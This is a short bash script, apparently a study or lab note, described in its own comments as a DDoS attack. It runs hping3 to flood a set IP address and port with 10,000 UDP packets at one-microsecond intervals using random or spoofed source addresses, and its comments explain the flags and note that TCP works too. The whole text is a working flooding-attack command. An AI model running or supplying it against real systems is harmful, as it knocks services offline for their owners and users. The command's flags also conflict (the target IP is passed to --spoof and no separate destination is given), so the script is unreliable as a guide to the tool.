#!/bin/bash
# Script for performing a normal DDoS attack

# Set the target IP address and port
TARGET_IP="10.1.1.5"
TARGET_PORT="80"

# Start the DDoS attack using hping3
hping3 -c 10000 --rand-source -i u1 --udp --spoof $TARGET_IP -p $TARGET_PORT


## THis will send -c 10000: Specifies the number of packets to send in the DDoS attack. In this case, it's set to 10,000 packets. -i u1: Sets the interval between each packet to 1 microsecond. This creates a high-rate attack by sending packets at a very fast pace.

## We could change the protocol from -- udp to --tcp with same code 